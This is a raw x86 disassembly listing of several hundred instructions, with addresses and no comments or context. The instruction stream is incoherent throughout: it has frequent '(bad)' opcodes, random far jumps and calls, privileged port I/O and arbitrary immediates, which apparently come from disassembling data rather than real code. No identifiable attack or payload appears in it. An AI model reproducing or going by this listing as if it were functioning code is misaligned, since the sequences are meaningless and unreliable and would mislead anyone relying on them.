  512bbe:	adc    DWORD PTR [ebx+0x6b9668d1],esp
  512bc4:	sub    dl,dl
  512bc6:	nop
  512bc7:	lock sahf 
  512bc9:	cmp    eax,0x76e09a46
  512bce:	xchg   ebp,eax
  512bcf:	cdq    
  512bd0:	xor    BYTE PTR [edi-0x75],dh
  512bd3:	push   ds
  512bd4:	push   ecx
  512bd5:	cmp    ecx,esi
  512bd7:	les    esp,FWORD PTR [esi+0x5166f2ae]
  512bdd:	and    BYTE PTR [edi],ah
  512bdf:	nop
  512be0:	bound  ebx,QWORD PTR ds:0x39b384de
  512be6:	dec    esi
  512be7:	push   eax
  512be8:	jns    0x512c07
  512bea:	pop    eax
  512beb:	pop    ecx
  512bec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  512bed:	mov    dh,BYTE PTR ds:0xa10d95f0
  512bf3:	mov    DWORD PTR [ebx+0x4c3e4d3],edx
  512bf9:	fidiv  WORD PTR [ecx+0x6c]
  512bfc:	xor    DWORD PTR [eax+0x1dacac10],ebp
  512c02:	pop    ebx
  512c03:	(bad)  
  512c04:	jmp    0x8c15:0x99d4575a
  512c0b:	popa   
  512c0c:	mov    cl,0xd4
  512c0e:	into   
  512c0f:	mov    dh,0xf8
  512c11:	(bad)  
  512c12:	cmp    BYTE PTR [edx],cl
  512c14:	ss adc al,0x35
  512c17:	ss lahf 
  512c19:	cwde   
  512c1a:	pop    edx
  512c1b:	add    al,cl
  512c1d:	push   ds
  512c1e:	sbb    dl,BYTE PTR [esi]
  512c20:	ins    BYTE PTR es:[edi],dx
  512c21:	xchg   ebx,eax
  512c22:	add    al,0xec
  512c24:	jb     0x512c04
  512c26:	dec    edx
  512c27:	sub    bl,BYTE PTR [esp+ecx*2-0x56]
  512c2b:	je     0x512c39
  512c2d:	pop    es
  512c2e:	sbb    al,0xf7
  512c30:	in     al,dx
  512c31:	daa    
  512c32:	sbb    DWORD PTR [edx-0x53bbbec4],edx
  512c38:	les    esp,FWORD PTR ds:0xc92e3a71
  512c3e:	std    
  512c3f:	lods   eax,DWORD PTR ds:[esi]
  512c40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  512c41:	das    
  512c42:	test   DWORD PTR [edx+0x30ab30f8],ebp
  512c48:	sbb    al,0xf6
  512c4a:	scas   eax,DWORD PTR es:[edi]
  512c4b:	ja     0x512cc1
  512c4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  512c4e:	jno    0x512c9c
  512c50:	pop    ebp
  512c51:	or     DWORD PTR [edi-0x33],edx
  512c54:	xlat   BYTE PTR ds:[ebx]
  512c55:	cmp    BYTE PTR [ebx+0x9],al
  512c58:	pop    eax
  512c59:	inc    esp
  512c5a:	jmp    0x4b95:0x213b7a88
  512c61:	stos   DWORD PTR es:[edi],eax
  512c62:	pusha  
  512c63:	jo     0x512bf9
  512c65:	sub    eax,DWORD PTR [ebp+ebp*4-0x7a21607a]
  512c6c:	sub    al,BYTE PTR [esi+0x5f]
  512c6f:	pusha  
  512c70:	add    eax,0x57b4cb62
  512c75:	push   edx
  512c76:	or     eax,0x490f9e49
  512c7b:	fisttp QWORD PTR [edi-0xfa65ce]
  512c81:	loope  0x512c2f
  512c83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  512c84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  512c85:	xchg   esp,eax
  512c86:	mov    ah,0xb
  512c88:	popa   
  512c89:	out    dx,al
  512c8a:	test   DWORD PTR [eax],0xacb38df0
  512c90:	pusha  
  512c91:	lahf   
  512c92:	ss mov ch,0xf
  512c95:	addr16 mov bh,0xab
  512c98:	ja     0x512c2e
  512c9a:	adc    dl,ch
  512c9c:	inc    edi
  512c9d:	stos   BYTE PTR es:[edi],al
  512c9e:	xor    BYTE PTR [edx],0x1
  512ca1:	stos   BYTE PTR es:[edi],al
  512ca2:	jo     0x512cc6
  512ca4:	adc    esp,DWORD PTR [ebp+0x47]
  512ca7:	and    bh,bh
  512ca9:	and    ebx,DWORD PTR [bx+si+0x6d]
  512cad:	adc    ecx,DWORD PTR fs:[edx+ecx*2-0x43]
  512cb2:	pop    edx
  512cb3:	cmpxchg BYTE PTR [esi],bh
  512cb6:	popf   
  512cb7:	xchg   esp,eax
  512cb8:	add    BYTE PTR [edi],ah
  512cba:	stos   BYTE PTR es:[edi],al
  512cbb:	inc    edx
  512cbc:	jecxz  0x512c9c
  512cbe:	(bad)  
  512cbf:	in     al,0xb4
  512cc1:	clc    
  512cc2:	or     bl,BYTE PTR [ecx-0x64]
  512cc5:	inc    esp
  512cc6:	pusha  
  512cc7:	pop    esp
  512cc8:	mov    dl,0x4f
  512cca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  512ccb:	sub    DWORD PTR [esi-0xf8cb926],esi
  512cd1:	xor    al,0x5e
  512cd3:	daa    
  512cd4:	jnp    0x512cda
  512cd6:	sbb    eax,0xa1937991
  512cdb:	push   ecx
  512cdc:	pop    ecx
  512cdd:	imul   edx,DWORD PTR [ecx],0x2f925609
  512ce3:	dec    edi
  512ce4:	(bad)  
  512ce5:	jo     0x512cd0
  512ce7:	inc    ecx
  512ce8:	int3   
  512ce9:	add    bl,BYTE PTR [esi+ebx*4]
  512cec:	imul   BYTE PTR [esi-0x6e]
  512cef:	loopne 0x512c7d
  512cf1:	mov    ebp,0x3ab04ad
  512cf6:	pop    ebx
  512cf7:	push   ecx
  512cf8:	xchg   BYTE PTR [edi-0x15],bh
  512cfb:	out    0x38,eax
  512cfd:	pusha  
  512cfe:	cs stos BYTE PTR es:[edi],al
  512d00:	mov    ebp,esp
  512d02:	push   ebp
  512d03:	in     al,0xa1
  512d05:	in     eax,0xc6
  512d07:	sub    al,0xe3
  512d09:	lods   eax,DWORD PTR ds:[esi]
  512d0a:	dec    esi
  512d0b:	aad    0xee
  512d0d:	test   DWORD PTR [ecx],edx
  512d0f:	or     eax,0x4ece27b4
  512d14:	stos   DWORD PTR es:[edi],eax
  512d15:	mov    bh,0x50
  512d17:	jle    0x512d19
  512d19:	fisubr WORD PTR [edx+ebx*8+0x3e]
  512d1d:	retf   
  512d1e:	pop    ecx
  512d1f:	and    DWORD PTR [eax],ebx
  512d21:	rol    DWORD PTR [ebx],cl
  512d23:	xor    eax,0x7e9e07f2
  512d28:	mov    ds,ebp
  512d2a:	sahf   
  512d2b:	xlat   BYTE PTR ds:[ebx]
  512d2c:	loope  0x512cd1
  512d2e:	js     0x512cba
  512d30:	sbb    ch,BYTE PTR [eax-0xcf8ad68]
  512d36:	cli    
  512d37:	sar    BYTE PTR [edx+0x30],cl
  512d3a:	sbb    al,BYTE PTR [ecx+0x30]
  512d3d:	rol    esi,1
  512d3f:	enter  0xb85e,0xf9
  512d43:	cld    
  512d44:	(bad)  
  512d45:	scas   eax,DWORD PTR es:[edi]
  512d46:	rcr    esp,1
  512d48:	and    edx,DWORD PTR [edi]
  512d4a:	fmul   DWORD PTR [edx+0x7e]
  512d4d:	sub    esp,esp
  512d4f:	int    0x13
  512d51:	jae    0x512d66
  512d53:	pop    esp
  512d54:	mov    eax,ds:0x200b290f
  512d59:	(bad)  
  512d5a:	aaa    
  512d5b:	xchg   edx,eax
  512d5c:	fnsave [eax+ecx*8]
  512d5f:	xchg   ecx,eax
  512d60:	push   ecx
  512d61:	outs   dx,DWORD PTR ds:[esi]
  512d62:	aam    0xf1
  512d64:	stos   BYTE PTR es:[edi],al
  512d65:	inc    edi
  512d66:	sub    eax,0x44635558
  512d6b:	popf   
  512d6c:	call   0xe0d03dc4
  512d71:	out    0x5f,eax
  512d73:	sbb    al,0x6c
  512d75:	xchg   edi,eax
  512d76:	pop    ebx
  512d77:	lods   al,BYTE PTR ds:[esi]
  512d78:	pop    ebx
  512d79:	shr    al,1
  512d7b:	ja     0x512d46
  512d7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  512d7e:	std    
  512d7f:	call   0x9016efec
  512d84:	sbb    bl,BYTE PTR [edi]
  512d86:	dec    eax
  512d87:	mov    eax,ds:0xe5348dcb
  512d8c:	pop    edx
  512d8d:	dec    ebx
  512d8e:	shrd   DWORD PTR [eax-0x5b34df2c],edx,0x8
  512d96:	icebp  
  512d97:	push   ds
  512d98:	push   edx
  512d99:	fsubr  DWORD PTR [esi]
  512d9b:	jo     0x512db2
  512d9d:	push   cs
  512d9e:	in     al,dx
  512d9f:	cmp    BYTE PTR [eax-0x53d9529e],al
  512da5:	stos   BYTE PTR es:[edi],al
  512da6:	(bad)  
  512da7:	(bad)  
  512da8:	ds inc ecx
  512daa:	arpl   WORD PTR cs:[ebx-0x79],cx
  512dae:	jmp    0xfb17:0xedb977fe
  512db5:	jmp    0x59b4:0xd9627eed
  512dbc:	call   0x9d87913
  512dc1:	dec    edi
  512dc2:	sub    ecx,DWORD PTR [eax]
  512dc4:	push   es
  512dc5:	mov    bl,0x68
  512dc7:	dec    esp
  512dc8:	mov    bl,0xb4
  512dca:	ja     0x512d78
  512dcc:	jmp    DWORD PTR [ebx+0x61b56206]
  512dd2:	cld    
  512dd3:	out    dx,al
  512dd4:	fnsave [esi-0x12]
  512dd7:	xlat   BYTE PTR ds:[ebx]
  512dd8:	jo     0x512dc8
  512dda:	js     0x512e0f
  512ddc:	outs   dx,BYTE PTR ds:[esi]
  512ddd:	loop   0x512e12
  512ddf:	mov    WORD PTR [ebp+0x2e],gs
  512de2:	rcr    DWORD PTR [ebp+0x43],0x3f
  512de6:	sub    BYTE PTR [ebx],dh
  512de8:	aaa    
  512de9:	and    bl,BYTE PTR ds:0xb6d0a3d
  512def:	dec    edi
  512df0:	add    BYTE PTR [ebp-0x30],cl
  512df3:	fistp  DWORD PTR [edx-0xb]
  512df6:	iret   
  512df7:	push   eax
  512df8:	dec    ecx
  512df9:	pop    esp
  512dfa:	inc    eax
  512dfb:	enter  0xbba9,0x26
  512dff:	inc    eax
  512e00:	ret    0x6c82
  512e03:	leave  
  512e04:	shl    BYTE PTR [edi+eax*2-0x2e],0xe7
  512e09:	cmp    al,0x18
  512e0b:	fadd   DWORD PTR [ecx+0x3e]
  512e0e:	xchg   ebp,eax
  512e0f:	xchg   ebp,eax
  512e10:	imul   dl
  512e12:	(bad)  
  512e13:	dec    ebx
  512e14:	popa   
  512e15:	jbe    0x512d9c
  512e17:	xor    ecx,DWORD PTR [edx+0x6f301511]
  512e1d:	pop    edi
  512e1e:	dec    esi
  512e1f:	sbb    DWORD PTR [edi-0x6],esp
  512e22:	sbb    al,0xe6
  512e24:	push   eax
  512e25:	data16 fwait
  512e27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  512e28:	arpl   si,cx
  512e2a:	inc    esp
  512e2b:	cmp    DWORD PTR [eax+0x53d6e99a],edi
  512e31:	jns    0x512eac
  512e33:	sub    dl,BYTE PTR [edi-0x5589c588]
  512e39:	add    eax,esi
  512e3b:	jne    0x512e5e
  512e3d:	sub    al,0xc6
  512e3f:	pop    edx
  512e40:	inc    ecx
  512e41:	push   es
  512e42:	lock mov al,ds:0x7439d867
  512e48:	in     eax,0xc9
  512e4a:	sahf   
  512e4b:	cmp    BYTE PTR [eax-0xb50657f],ah
  512e51:	popa   
  512e52:	pop    es
  512e53:	mov    BYTE PTR [esi-0x44d3a8d8],al
  512e59:	xchg   BYTE PTR [edx+edx*2],bl
  512e5c:	add    al,0xcb
  512e5e:	xor    DWORD PTR [ebx+0x3b682e77],edi
  512e64:	and    al,0xb9
  512e66:	call   0x8c4b80f4
  512e6b:	sub    al,0xe3
  512e6d:	pop    edx
  512e6e:	pop    ss
  512e6f:	dec    edx
  512e70:	sub    bh,ah
  512e72:	adc    BYTE PTR [ecx],cl
  512e74:	cmp    DWORD PTR ds:0x8b76dbe2,eax
  512e7a:	add    al,0xe3
  512e7c:	test   eax,0xcb0003a4
  512e81:	fwait
  512e82:	adc    ecx,DWORD PTR [edx+eiz*8]
  512e85:	push   ebx
  512e86:	lar    ebx,WORD PTR [eax+edi*8-0x1d]
  512e8b:	and    edx,DWORD PTR [esi+0x55a63624]
  512e91:	or     al,0x2e
  512e93:	pop    ds
  512e94:	jbe    0x512e85
  512e96:	push   esp
  512e97:	mov    bl,dh
  512e99:	push   cs
  512e9a:	cli    
  512e9b:	sub    esi,ebx
  512e9d:	add    BYTE PTR [eax],cl
  512e9f:	scas   eax,DWORD PTR es:[edi]
  512ea0:	cmp    ebx,eax
  512ea2:	and    al,dl
  512ea4:	int    0x49
  512ea6:	dec    edx
  512ea7:	dec    edi
  512ea8:	dec    ebp
  512ea9:	xor    eax,0x6c719372
  512eae:	fisub  WORD PTR [edx-0x32]
  512eb1:	mov    esi,0xf18e7a22
  512eb6:	mov    DWORD PTR [ecx-0x1ad8f780],0xf0926f06
  512ec0:	xor    DWORD PTR [ebx+esi*4],esp
  512ec3:	cmp    eax,DWORD PTR [edx-0x2862ceb0]
  512ec9:	in     eax,dx
  512eca:	es or  eax,0x65
  512ece:	xor    edi,DWORD PTR [ecx]
  512ed0:	iret   
  512ed1:	or     ebp,edi
  512ed3:	push   0x56
  512ed5:	les    esp,FWORD PTR [eax+0xc]
  512ed8:	out    0x19,eax
  512eda:	xor    ebp,ebx
  512edc:	xchg   ecx,eax
  512edd:	pop    esp
  512ede:	push   esi
  512edf:	or     al,0x82
  512ee1:	mov    al,0x5f
  512ee4:	mov    eax,ds:0xe21a7e50
  512ee9:	mov    esi,0xe9e2de5
  512eee:	out    0x70,al
  512ef0:	lods   eax,DWORD PTR ds:[esi]
  512ef1:	mov    dl,0x19
  512ef3:	sub    eax,0x38d195a6
  512ef8:	mov    ss,WORD PTR [ecx]
  512efa:	test   al,0xa
  512efc:	push   ebp
  512efd:	mov    eax,0x13717d4e
  512f02:	test   eax,0x7e77c768
  512f07:	sbb    esp,DWORD PTR [eax-0x63ae54fc]
  512f0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  512f0e:	mov    edi,0x5998fd10
  512f13:	cld    
  512f14:	jg     0x512f59
  512f16:	(bad)  
  512f17:	sbb    DWORD PTR [edi],ecx
  512f19:	mov    ds:0x8e482265,eax
  512f1e:	pop    ebp
  512f1f:	cli    
  512f20:	(bad)  
  512f21:	nop
  512f22:	fwait
  512f23:	push   cs
  512f24:	push   es
  512f25:	fcmove st,st(7)
  512f27:	xchg   ebx,eax
  512f28:	jge    0x512f7e
  512f2a:	scas   al,BYTE PTR es:[edi]
  512f2b:	sbb    al,0x92
  512f2d:	and    bh,cl
  512f2f:	mov    bh,0x64
  512f31:	mov    ch,0xca
  512f33:	fdivr  DWORD PTR [eax+eiz*2-0x78bcde03]
  512f3a:	rcr    BYTE PTR [ebx],cl
  512f3c:	dec    ebx
  512f3d:	xchg   esi,eax
  512f3e:	pop    es
  512f3f:	dec    eax
  512f40:	mov    bh,0x1f
  512f42:	sbb    DWORD PTR [ebx],0xd3477d35
  512f48:	cli    
  512f49:	adc    eax,0xcbada730
  512f4e:	xor    ebx,DWORD PTR [edi]
  512f50:	dec    ebx
  512f51:	cld    
  512f52:	push   cs
  512f53:	jp     0x512fa4
  512f55:	fisttp QWORD PTR [eax]
  512f57:	sbb    BYTE PTR [ebp+eax*1-0x101720fd],0xb0
  512f5f:	push   ebx
  512f60:	dec    esp
  512f61:	retf   
  512f62:	dec    esp
  512f63:	repnz add DWORD PTR [esi],0x7
  512f67:	inc    ebp
  512f68:	jl     0x512fe1
  512f6a:	xor    DWORD PTR [ebx+0x2c],0xfffffffe
  512f6e:	ja     0x512f60
  512f70:	pop    esp
  512f71:	clc    
  512f72:	mov    dh,BYTE PTR ds:0x559f10f
  512f78:	lock imul edx,ecx,0xffffffe8
  512f7c:	and    esp,DWORD PTR ds:0x236b0b25
  512f82:	nop
  512f83:	ret    
  512f84:	cmc    
  512f85:	call   0xa55c:0x85f5150f
  512f8c:	mov    eax,ds:0x5185f0c7
  512f91:	jnp    0x512f54
  512f93:	enter  0x15fe,0x73
  512f97:	fldenv [eax+0x3c]
  512f9a:	popa   
  512f9b:	cmp    ecx,edi
  512f9d:	jo     0x512fa0
  512f9f:	mov    DWORD PTR [ecx],edi
  512fa1:	push   esi
  512fa2:	ss mov dl,0x9b
  512fa5:	lds    esp,FWORD PTR [esi-0x774d6cf1]
  512fab:	call   0x224c:0x64e5f4e3
  512fb2:	dec    eax
  512fb3:	jp     0x512ffc
  512fb5:	lods   al,BYTE PTR ds:[esi]
  512fb6:	enter  0x5e61,0x9d
  512fba:	xor    esp,DWORD PTR [ecx+0x7a33c6c]
  512fc0:	fidivr DWORD PTR [eax+0x73fbedf1]
  512fc6:	arpl   WORD PTR [edi+0x6187ab92],dx
  512fcc:	xor    al,0xa9
  512fce:	sbb    eax,0xe7e163df
  512fd3:	push   edx
  512fd4:	nop
  512fd5:	adc    al,0xf3
  512fd7:	retf   0x84a0
  512fda:	jae    0x512f64
  512fdc:	xchg   ebp,eax
  512fdd:	xchg   edx,eax
  512fde:	pushf  
  512fdf:	repz aas 
  512fe1:	dec    ebx
  512fe2:	sbb    DWORD PTR ds:0xbb0f7d1e,ecx
  512fe8:	aaa    
  512fe9:	das    
  512fea:	mul    DWORD PTR [eax+0x4e3e0bf7]
  512ff0:	push   ecx
  512ff1:	mov    eax,ds:0x9f16e9a9
  512ff6:	cmp    al,0x73
  512ff8:	adc    BYTE PTR [ebp+eax*4+0x499b18b3],dh
  512fff:	scas   eax,DWORD PTR es:[edi]
  513000:	and    DWORD PTR [ebp+eax*2-0x5844622e],eax
  513007:	in     eax,0xb1
  513009:	les    esp,FWORD PTR [ebp+eiz*8+0x44]
  51300d:	mov    dl,bh
  51300f:	add    al,0xd1
  513011:	and    eax,0xb3f396ba
  513016:	sub    dl,dl
  513018:	fadd   QWORD PTR [ecx]
  51301a:	mov    esp,0x2c66a24f
  51301f:	ja     0x51309e
  513021:	push   esp
  513022:	jae    0x513028
  513024:	nop
  513025:	fwait
  513026:	cmp    DWORD PTR [edx+ebp*2],ebp
  513029:	dec    eax
  51302a:	sbb    BYTE PTR [edx+0x11685f83],bl
  513030:	or     BYTE PTR [eax+0x66],dl
  513033:	adc    dl,BYTE PTR [ecx-0x5c]
  513036:	and    esp,DWORD PTR [esi+0x3fe5debe]
  51303c:	rep ins DWORD PTR es:[edi],dx
  51303e:	in     al,dx
  51303f:	xor    ecx,DWORD PTR [di]
  513042:	in     al,dx
  513043:	xor    BYTE PTR [eax-0x26522d86],al
  513049:	push   0xffffff8c
  51304b:	sti    
  51304c:	add    BYTE PTR [ebp+0x49f4af74],dl
  513052:	lea    eax,[ebx]
  513054:	or     BYTE PTR [ebp-0x1bcf109f],bh
  51305a:	sbb    eax,DWORD PTR [edx+ebp*4-0x6da4a728]
  513061:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  513062:	pop    eax
  513063:	sahf   
  513064:	add    DWORD PTR [esi],esi
  513066:	sub    DWORD PTR [ecx-0x58],edi
  513069:	inc    ebp
  51306a:	push   0xffffffb2
  51306c:	or     al,0x97
  51306e:	sbb    eax,DWORD PTR [ecx]
  513070:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  513071:	sahf   
  513072:	sbb    eax,0xfd411144
  513077:	shr    BYTE PTR [ebx],0xa2
  51307a:	push   esi
  51307b:	pop    ds
  51307c:	sbb    cl,dh
  51307e:	push   es
  51307f:	dec    edx
  513080:	mov    bh,0x3b
  513082:	test   BYTE PTR [ecx+0x5947bcbd],dh
  513088:	in     eax,dx
  513089:	clc    
  51308a:	jns    0x513080
  51308c:	inc    ecx
  51308d:	ret    
  51308e:	or     eax,0x509027c8
  513093:	mov    edx,0x348ced5d
  513098:	ret    
  513099:	xchg   esp,eax
  51309a:	inc    ebp
  51309b:	xor    al,0xcf
  51309d:	mov    BYTE PTR [ebx+ebx*2+0x43],al
  5130a1:	repnz mov ebp,0x52c4588d
  5130a7:	inc    BYTE PTR [esi+0x6f]
  5130aa:	add    al,0xac
  5130ac:	dec    edi
  5130ad:	pop    esp
  5130ae:	mov    eax,0x415fe9d0
  5130b3:	lea    ebx,[ebx]
  5130b5:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  5130b7:	stc    
  5130b8:	cwde   
  5130b9:	dec    eax
  5130ba:	mov    edi,eax
  5130bc:	imul   edi,ebx,0x7f
  5130bf:	jns    0x51308d
  5130c1:	pop    eax
  5130c2:	jmp    DWORD PTR [edi+0x57]
  5130c5:	jne    0x51305b
  5130c7:	push   0x7e
  5130c9:	and    BYTE PTR [ecx],dh
  5130cb:	fyl2x  
  5130cd:	ja     0x5130a9
  5130cf:	data16 cli 
  5130d1:	push   ss
  5130d2:	add    BYTE PTR [edi+0x46],bl
  5130d5:	add    ecx,DWORD PTR [esp+eax*1+0x2c]
  5130d9:	xor    eax,0x1ae258
  5130de:	imul   esp,DWORD PTR [eax-0x18],0xffffffa3
  5130e2:	cli    
  5130e3:	dec    ecx
  5130e4:	xor    DWORD PTR [edx+0x3126369],0xc6817135
  5130ee:	data16 lods al,BYTE PTR ds:[esi]
  5130f0:	lea    esp,[esi+0x1b]
  5130f3:	dec    ecx
  5130f4:	xchg   edi,eax
  5130f5:	xchg   edi,eax
  5130f6:	inc    edi
  5130f7:	fadd   QWORD PTR [eax]
  5130f9:	fdivp  st(1),st
  5130fb:	cmp    esi,ecx
  5130fd:	outs   dx,DWORD PTR ds:[esi]
  5130fe:	fs popf 
  513100:	clc    
  513101:	cmp    BYTE PTR [ebp-0x5b5b5074],cl
  513107:	and    BYTE PTR [ebx],0x2
  51310a:	jno    0x5130ab
  51310c:	fsubrp st(2),st
  51310e:	ins    BYTE PTR es:[edi],dx
  51310f:	and    DWORD PTR [edi+0x7933f3c1],0xf492622
  513119:	cld    
  51311a:	mov    eax,DWORD PTR ds:0x2258aa0c
  513120:	das    
  513121:	daa    
  513122:	lods   eax,DWORD PTR ds:[esi]
  513123:	mov    ch,0x7d
  513125:	fs addr16 enter 0x8f7e,0x10
  51312b:	adc    al,0x32
  51312d:	inc    ebp
  51312e:	inc    eax
  51312f:	inc    ecx
  513130:	mov    ebp,0x2cf07aae
  513135:	adc    al,0x8
  513137:	lea    eax,[ecx]
  513139:	cs xchg ebp,eax
  51313b:	xlat   BYTE PTR ds:[ebx]
  51313c:	(bad)
  51313f:	xchg   edx,eax
  513140:	jb     0x513166
  513142:	or     ch,bl
  513144:	push   esi
  513145:	push   esi
  513146:	ja     0x513101
  513148:	addr16 pop esi
  51314a:	scas   eax,DWORD PTR es:[edi]
  51314b:	mov    cl,BYTE PTR [eax-0x3828f04e]
  513151:	xchg   edx,eax
  513152:	call   0x63563d92
  513157:	pop    esi
  513158:	out    0xbf,al
  51315a:	sbb    DWORD PTR [ebx+0x30],ecx
  51315d:	add    eax,edi
  51315f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  513160:	icebp  
  513161:	and    al,0xb0
  513163:	lods   eax,DWORD PTR ds:[esi]
  513164:	jae    0x5130f5
  513166:	arpl   WORD PTR [esi-0x3],dx
  513169:	inc    esp
  51316a:	cs icebp 
  51316c:	in     eax,0xc5
  51316e:	pop    ss
  51316f:	xlat   BYTE PTR ds:[ebx]
  513170:	or     eax,0x1d8d7d0e
  513175:	xor    bl,ah
  513177:	sub    esi,ecx
  513179:	jg     0x5131d6
  51317b:	jno    0x5131c9
  51317d:	inc    ebp
  51317e:	add    dl,al
  513180:	and    al,0xd9
  513182:	icebp  
  513183:	loope  0x513117
  513185:	mov    ds:0xdb5c779,eax
  51318a:	lea    ebx,[esi+0x69650a97]
  513190:	sub    eax,0x13ec120d
  513195:	sbb    DWORD PTR [ebp+0x3d],esp
  513198:	(bad)  
  513199:	(bad)  
  51319a:	fisub  WORD PTR ds:0xbff480bd
  5131a0:	shl    BYTE PTR [esi+0x17],1
  5131a3:	cwde   
  5131a4:	loope  0x513203
  5131a6:	cmp    dl,0xa2
  5131a9:	xchg   edx,eax
  5131aa:	xchg   ebp,eax
  5131ab:	lods   al,BYTE PTR ds:[esi]
  5131ac:	jmp    0xff5b0d7f
  5131b1:	stos   BYTE PTR es:[edi],al
  5131b2:	loope  0x5131c9
  5131b4:	loope  0x5131da
  5131b6:	mov    ebx,ebx
  5131b8:	xor    eax,0x411a8e07
  5131bd:	and    DWORD PTR [ecx],ebp
  5131bf:	lods   al,BYTE PTR ds:[esi]
  5131c0:	sbb    dh,BYTE PTR [ebx+ecx*8-0x645e3d0]
  5131c7:	mov    esi,0xc9d15441
  5131cc:	lods   eax,DWORD PTR ds:[esi]
  5131cd:	outs   dx,DWORD PTR ds:[esi]
  5131ce:	dec    ecx
  5131cf:	sar    DWORD PTR [esi+esi*4],cl
  5131d2:	daa    
  5131d3:	rep lods eax,DWORD PTR ds:[esi]
  5131d5:	push   esi
  5131d6:	xor    ch,cl
  5131d8:	jne    0x5131d8
  5131da:	arpl   WORD PTR [esi+0x53],di
  5131dd:	aad    0x78
  5131df:	xchg   esi,eax
  5131e0:	arpl   WORD PTR [eax+0x209ad68d],cx
  5131e6:	pop    es
  5131e7:	call   0x2097cb4c
  5131ec:	push   ss
  5131ed:	cmp    BYTE PTR [ecx+0x4b],ah
  5131f0:	ds xchg edi,eax
  5131f2:	jge    0x5131d5
  5131f4:	mov    dl,0x72
  5131f6:	(bad)
  5131fa:	jnp    0x513276
  5131fc:	call   0xbae2:0xb5f8ce0c
  513203:	int    0xca
  513205:	xchg   ecx,eax
  513206:	std    
  513207:	or     al,0x30
  513209:	sbb    esi,DWORD PTR [eax+0x3c3a6ed2]
  51320f:	jno    0x513234
  513211:	push   esp
  513212:	outs   dx,DWORD PTR ds:[esi]
  513213:	or     eax,0x12e667d2
  513218:	daa    
  513219:	mov    edi,0xd22a1a36
  51321e:	in     al,dx
  51321f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  513220:	or     al,0x7
  513222:	repnz daa 
  513224:	mov    ecx,0x503dda65
  513229:	inc    edi
  51322a:	mov    ch,0xf0
  51322c:	outs   dx,DWORD PTR ds:[esi]
  51322d:	out    dx,eax
  51322e:	xchg   esi,eax
  51322f:	pop    es
  513230:	jg     0x5131c5
  513232:	jmp    0x30b5:0x21ae2b35
  513239:	cmp    al,0x27
  51323b:	mov    edx,0xac548726
  513240:	add    DWORD PTR [esi],ecx
  513242:	sub    BYTE PTR [eax],dl
  513244:	or     al,cl
  513246:	(bad)  
  513248:	adc    al,BYTE PTR [eax+0x75]
  51324b:	pop    ebp
  51324c:	div    BYTE PTR [esi+0x604568fb]
  513252:	add    ax,0x5785
  513256:	cs retf 0x849f
  51325a:	pop    esi
  51325b:	fisttp WORD PTR [esi-0x50]
  51325e:	dec    ecx
  51325f:	sub    BYTE PTR [edi-0x52],bl
  513262:	mov    eax,0x34f97d62
  513267:	and    DWORD PTR [ebx+0x2b],0x8710d880
  51326e:	mov    esp,0x52b1c4eb
  513273:	out    dx,eax
  513274:	in     al,dx
  513275:	mov    DWORD PTR ds:0x56af889b,ecx
  51327b:	cmp    DWORD PTR [ebx+0x51ffa669],esi
  513281:	and    esp,DWORD PTR [ebx-0x56]
  513284:	cmp    esi,eax
  513286:	fcomp  DWORD PTR [esi-0x7c]
  513289:	stos   BYTE PTR es:[edi],al
  51328a:	outs   dx,BYTE PTR ds:[esi]
  51328b:	pop    ecx
  51328c:	jecxz  0x51329f
  51328e:	jo     0x513269
  513290:	loopne 0x513220
  513292:	inc    esp
  513293:	test   DWORD PTR [ecx+0x14],esp
  513296:	das    
  513297:	jmp    0x51330c
  513299:	dec    ebx
  51329a:	(bad)  
  51329b:	jmp    0x513240
  51329d:	mov    cl,0xfa
  51329f:	es (bad) 
  5132a2:	xlat   BYTE PTR ds:[ebx]
  5132a3:	pop    es
  5132a4:	or     ebx,esp
  5132a6:	loopne 0x513266
  5132a8:	mov    ebx,0xbe24ca0
  5132ad:	sub    dh,dh
  5132af:	push   0x7c
  5132b1:	(bad)  
  5132b2:	call   0x4eb44546
  5132b7:	mov    WORD PTR [esi],cs
  5132b9:	or     dh,ah
  5132bb:	xchg   esi,eax
  5132bc:	pushf  
  5132bd:	fcom   DWORD PTR [edx-0x6259bb5b]
  5132c3:	imul   eax,DWORD PTR [ebx],0x6a
  5132c6:	inc    esi
  5132c7:	repz push 0x5acf421b
  5132cd:	scas   eax,DWORD PTR es:[edi]
  5132ce:	imul   edx,DWORD PTR [esi],0xffffffca
  5132d1:	das    
  5132d2:	mov    ecx,0x33290e3a
  5132d7:	out    0xb2,eax
  5132d9:	retf   0x4f6d
  5132dc:	test   DWORD PTR [ecx],esp
  5132de:	int3   
  5132df:	jbe    0x51328b
  5132e1:	add    ecx,DWORD PTR ds:0x4048891e
  5132e7:	inc    esp
  5132e8:	sbb    ebx,DWORD PTR [esi-0x16]
  5132eb:	fimul  WORD PTR [esi]
  5132ed:	add    DWORD PTR [esi],ecx
  5132ef:	jo     0x5132c6
  5132f1:	cmc    
  5132f2:	sbb    bl,BYTE PTR [ebx-0xb]
  5132f5:	fwait
  5132f6:	ins    BYTE PTR es:[edi],dx
  5132f7:	xchg   esi,eax
  5132f8:	ret    
  5132f9:	cli    
  5132fa:	sbb    al,0xf1
  5132fc:	dec    esp
  5132fd:	inc    ebx
  5132fe:	xor    BYTE PTR [ecx],cl
  513300:	fld    TBYTE PTR [ecx+esi*2+0x2660c349]
  513307:	mov    ebx,gs
  513309:	mov    edx,0x8e67a408
  51330e:	mov    BYTE PTR [edi],dl
  513310:	jecxz  0x5132db
  513312:	ret    
  513313:	lods   eax,DWORD PTR ds:[esi]
  513314:	cmp    ch,BYTE PTR [ecx+0x4a]
  513317:	xchg   esi,eax
  513318:	inc    ecx
  513319:	(bad)  
  51331a:	xchg   ecx,eax
  51331b:	lahf   
